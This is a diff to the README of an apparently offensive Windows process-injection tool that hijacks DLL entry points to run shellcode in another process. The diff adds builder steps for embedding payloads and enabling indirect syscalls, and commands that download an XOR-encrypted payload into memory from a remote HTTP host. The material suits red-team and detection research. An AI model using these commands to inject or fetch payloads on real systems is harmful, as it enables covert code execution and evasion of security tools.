@@ -8,7 +8,7 @@ Before exiting, the Loader restores the PEB and other modified structures to the
 
 By default, this tool hijacks `kernelbase.dll` entry point. Feel free to target a different dll, but make sure that the dll is loaded in both processes involved in this activity.
 
-The provided shellcode embbeded in the Loader spawns a new `cmd.exe /k msg "hello from kudaes"` process.
+The provided shellcode embedded in the Loader spawns a new `cmd.exe /k msg "hello from kudaes"` process.
 
 The advantages of this technique are the following:
 * Both threadless or threaded execution, at will.
@@ -38,29 +38,40 @@ After that, run the tool:
 
 ## No Loader - Custom payload
 
-If you just want to directly execute your custom shellcode without using the Loader, you have to replace the value of the `bytes` variable (`EPI::src::main.rs:13`) with the hexadecimal content of your payload. Then, compile the project and run the tool:
+If you just want to directly execute your custom shellcode without using the Loader (which is *highly unrecommended*), just run `builder.py` with the flag `-p` indicating the full path of your payload file. Then, just run `epi.exe`:
 
-	C:\Users\User\Desktop\EPI\EPI> cargo build --release
+	C:\Users\User\Desktop\EPI> python3 builder.py -p c:\path\to\payload.bin
 	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -h 
 
-Be aware that, depending on the behaviour of your shellcode, you might end up hijacking the thread and potentially causing a process crash.
+In case you dont want to embed the payload in the resulting binary, you can encrypt it (simple xor encryption) using the `-d` flag and then download it directly into the injector's process memory using HTTP:
+
+	C:\Users\User\Desktop\EPI> python3 builder.py -p c:\path\to\payload.bin -d
+
+The resulting encrypted payload will be written to the `payload` directory. The encryption key will be the same value used for the `LITCRYPT_ENCRYPT_KEY` environment variable. You have to pass this value to `epi.exe` to be able to decrypt the payload in runtime:
+
+	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p <PID> -u http://remoteip/payload.bin -k setarandomkeyeachtime [flags]
+
+Be aware that, depending on the behaviour of your shellcode, you might end up hijacking the thread and potentially causing a process crash. Also, take into account that no cleanup will be performed when injecting this way, leading to all kind of unexpected process behaviours.
 
 ## Loader & Custom payload
 
-This is my recommended choice, since it allows you to fully customize the execution in the most reliable way. This is the right option if you want to run a different payload than the one provided and use the functionality of the Loader to avoid the crash of the target process.
+This is my recommended choice, since it allows you to fully customize the execution in the most reliable way. This is the right option if you want to run a different payload than the one provided and use the functionality of the Loader to avoid the crash of the target process. Also, the Loader is responsible for performing the cleanup and restoring the modified structures to their previous state.
 
-First, you have to replace the value of the `bytes` variable in the Loader (`Loader::src::lib.rs:14`) with the hexadecimal content of your payload. Then, compile the project as usual:
-	
-	C:\Users\User\Desktop\EPI\Loader> cargo build --release
+To build the tool, run `builder.py` with the `-l` flag to indicate the use of the Loader. In case you want to enable the use of indirect syscalls in the Loader, you can do so by passing the `-i` flag.
 
-Then, use the provided Python script `ConvertToShellcode.py` to convert the generated `loader.dll` into sRDI. I've obtained this script from the fantastic [sRDI](https://github.com/monoxgas/sRDI/tree/master) project after fixing some [issues](https://github.com/monoxgas/sRDI/pull/32) that were generating multi-hour long delays.
+	C:\Users\User\Desktop\EPI> python3 builder.py -l -p c:\path\to\payload.bin [-i]
 
-	C:\Users\User\Desktop\EPI\sRDI> python3 ConvertToShellcode.py -f run ..\Loader\target\release\loader.dll
+This execution will embed your payload in the Loader, compile the Loader, convert it into sRDI and embed the final PIC code in EPI. Once the builder ends its execution, the injector is ready to be used:
 
-This execution should generate a `loader.bin` file. Again, get its hex content and use it to replace the value of the `bytes` variable in the EPI project (`EPI::src::main.rs:13`). Finally, compile EPI and run the tool:
+	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p <PID> [flags]
 
-	C:\Users\User\Desktop\EPI\EPI> cargo build --release
-	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -h 
+Again, if you don't want to embed the final PIC code in the resulting binary, you can encrypt it (simple xor encryption) passing the `-d` flag to the builder and then download it directly into the injector's process memory using HTTP:
+
+	C:\Users\User\Desktop\EPI> python3 builder.py -l -p c:\path\to\payload.bin -d [-i]
+
+The resulting encrypted payload will be written to the `payload` directory. The encryption key will be the same value used for the `LITCRYPT_ENCRYPT_KEY` environment variable. This value has to be passed to `epi.exe` to be able to decrypt the payload in runtime:
+
+	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p <PID> -u http://remoteip/payload.bin -k setarandomkeyeachtime [flags]
 
 # Usage 
 
@@ -68,9 +79,9 @@ The basic usage is by passing to the tool the PID of the target process and wait
 
 	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p 1337
 
-In case that you need to enable the `DEBUG` privilege to perform the injection, you can use the flag `-d`.
+In case that you need to enable the `DEBUG` privilege to perform the injection, you can use the flag `-d`. Also, the use of indirect syscalls in the injector can be enabled using the `-i` flag 
 
-	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p 1337 -d
+	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p 1337 -d -i 
 
 If you do not want to wait until a new thread is naturally spawned, you can use the flag `-f` to spawn a new dummy thread. This dummy thread will run [ExitThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitthread) (i.e. it's a self destructing thread), but before that it will call every single loaded module's entry point, including our shellcode. The good part of this is that despite making the technique threaded, the new spawned thread's initial routine will point to ExitThread and not to our injected shellcode.
 
@@ -80,6 +91,9 @@ Finally, you can also force the execution of the injected shellcode by sending a
 
  	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p 1337 -s
 
+In case that you built the payload so that it is downloaded directly into memory, the `-u` (remote HTTP site serving the payload) and `-k` (decryption key) must be passed to the injector.
+	
+	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p <PID> -u http://remoteip/payload.bin -k setarandomkeyeachtime [flags]
 
 # Tips
 
@@ -107,9 +121,7 @@ Actually, you could also just wait for a minute or less since most of this kind 
 # TODO
 
 * Clean memory artifacts.
-* Test other sRDI generators.
 * Allow to target other dll than kernelbase.dll.
-* Indirect syscalls and other maldev stuff.
 
 # Credits
 
